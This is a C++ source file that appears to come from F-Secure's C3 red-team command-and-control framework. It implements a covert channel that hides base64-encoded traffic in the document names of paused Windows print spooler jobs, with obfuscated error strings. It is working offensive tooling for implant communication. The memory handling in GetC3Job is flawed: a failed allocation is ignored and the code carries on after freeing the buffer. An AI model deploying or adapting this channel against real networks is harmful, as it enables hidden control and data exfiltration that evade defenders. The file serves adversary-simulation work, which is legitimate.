#include "Stdafx.h"
#include "Print.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include <Windows.h>
#include <Winspool.h>

namespace FSecure::C3::Interfaces::Channels
{
	using namespace FSecure::StringConversions;

	Detail::PrinterHandle Detail::PrinterHandle::Open(std::string_view printerAddress)
	{
		HANDLE handle;
		PRINTER_DEFAULTS defaults {};
		std::wstring printer = Convert<Utf16>(printerAddress);
		defaults.DesiredAccess = PRINTER_ACCESS_USE;
		if (!OpenPrinter2(printer.c_str(), &handle, &defaults, nullptr))
			throw std::runtime_error{ OBF("Can't connect to printer") };

		return { handle };
	}

	Print::Print(ByteView arguments)
		: m_inboundDirectionName{ arguments.Read<std::string>() }
		, m_outboundDirectionName{ arguments.Read<std::string>() }
		, m_jobIdentifier{ arguments.Read<std::string>() }
		, m_printerAddress{ arguments.Read<std::string>() }
		, m_maxPacketSize{ arguments.Read<uint32_t>() }
		, m_pHandle{ Detail::PrinterHandle::Open(m_printerAddress) }
	{
	}

	size_t Print::OnSendToChannel(ByteView data)
	{
		// Find out what size chunks we're able to send
		size_t sizeOfDataToWrite = CalculateDataSize(data);
		// Encode the data
		std::string dataToWrite = EncodeData(data, sizeOfDataToWrite);
		//Check if there's an existing print job waiting to be read
		auto [document, jobID] = GetC3Job();
		//If there is then we're not ready to write another
		if (!document.empty())
			return 0;

		if (WriteData(dataToWrite) == 0)
			return 0;

		return sizeOfDataToWrite;
	}

	ByteVector Print::OnReceiveFromChannel()
	{
		//Check if there's an existing print job waiting to be read
		auto [document, jobID] = GetC3Job();
		// If there isn't then there's nothing to be read
		if (document.empty())
			return {};

		// If it's not destined for us then ignore it
		std::wstring docName = document;
		if (docName.find(Convert<Utf16>(m_inboundDirectionName)) == std::string::npos)
			return {};

		//Remove trailing jobIdentifier and lock, then decode the remaining data wstring
		std::string convertedData = Convert<Utf8>(docName.substr(0, docName.size() - m_inboundDirectionName.size() - m_jobIdentifier.size()));
		ByteVector ret = base64::decode(convertedData);
		//Delete the job so more data can be sent
		if (SetJob(m_pHandle.Get(), jobID, 0, NULL, JOB_CONTROL_DELETE) == 0)
			throw std::runtime_error{ OBF("Failed to delete job") };

		return ret;
	}

	std::tuple<std::wstring, DWORD> Print::GetC3Job()
	{
		DWORD       dwNeeded, dwReturned, i;
		JOB_INFO_2* pJobInfo;
		// First you call EnumJobs() to find out how much memory you need
		if (!EnumJobs(m_pHandle.Get(), 0, 0xFFFFFFFF, 2, NULL, 0, &dwNeeded, &dwReturned))
		{
			// It should have failed, but if it failed for any reason other
			// than "not enough memory", you should bail out
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
				throw std::runtime_error{ OBF("Couldn't enumerate jobs") };
		}
		// Allocate enough memory for the JOB_INFO_2 structures plus
		// the extra data - dwNeeded from the previous call tells you
		// the total size needed
		if ((pJobInfo = (JOB_INFO_2*)malloc(dwNeeded)) == NULL)
		{
		}
		// Call EnumJobs() again and let it fill out our structures
		if (!EnumJobs(m_pHandle.Get(), 0, 0xFFFFFFFF, 2, (LPBYTE)pJobInfo, dwNeeded, &dwNeeded, &dwReturned))
		{
			free(pJobInfo);
		}
		// It's easy to loop through the jobs and access each one
		for (i = 0; i < dwReturned; i++)
		{
			std::wstring docName = pJobInfo[i].pDocument;
			// Check that it's a C3 job
			if (docName.compare(docName.size() - 2, docName.size(), Convert<Utf16>(m_jobIdentifier)) == 0)
			{
				return { pJobInfo[i].pDocument, pJobInfo[i].JobId };
			}
		}
		// If we get to here then no C3 job exists
		// Clean up
		free(pJobInfo);
		return {};
	}

	DWORD Print::WriteData(std::string dataToWrite)
	{
		DOC_INFO_1 docInfo{};
		std::wstring data = Convert<Utf16>(dataToWrite.c_str());
		std::wstring identifier = Convert<Utf16>(m_outboundDirectionName) + Convert<Utf16>(m_jobIdentifier);
		std::wstring docName = data + identifier;
		docInfo.pDocName = (LPWSTR)docName.c_str();
		docInfo.pOutputFile = NULL;
		docInfo.pDatatype = (LPWSTR)L"RAW";

		int jobId = StartDocPrinter(m_pHandle.Get(), 1, (LPBYTE)&docInfo);
		if (jobId == 0)
			throw std::runtime_error{ OBF("Couldn't write data") };

		if (SetJob(m_pHandle.Get(), jobId, 0, NULL, JOB_CONTROL_PAUSE) == 0)
			throw std::runtime_error{ OBF("Couldn't pause job") };

		if (EndDocPrinter(m_pHandle.Get()) == 0)
			throw std::runtime_error{ OBF("Couldn't write data") };

		return jobId;
	}

	size_t Print::CalculateDataSize(ByteView data)
	{
		auto trueDataSize = m_maxPacketSize - m_outboundDirectionName.size() - m_jobIdentifier.size();
		auto maxPacketSize = base64::decoded_max_size(trueDataSize);
		return std::min(maxPacketSize, data.size());
	}

	std::string Print::EncodeData(ByteView data, size_t dataSize)
	{
		auto sendData = data.SubString(0, dataSize);
		return base64::encode(sendData.data(), sendData.size());
	}

	const char* Print::GetCapability()
	{
		return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
                "type": "string",
                "name": "Job Identifier",
                "min": 1,
				"defaultValue": "C3",
                "description": "The unique string from which C3 jobs can be identified on the spooler"
            },
			{
                "type": "string",
                "name": "Printer Address",
                "min": 1,
				"defaultValue": "",
                "description": ""
            },
			{
                "type": "uint32",
                "name": "Max Packet Size",
                "min": 1,
				"defaultValue": "1048576",
                "description": "Maximum packet size (document name) that target print queue supports"
            }
		]
	},
	"commands": []
}
)_";
	}
}
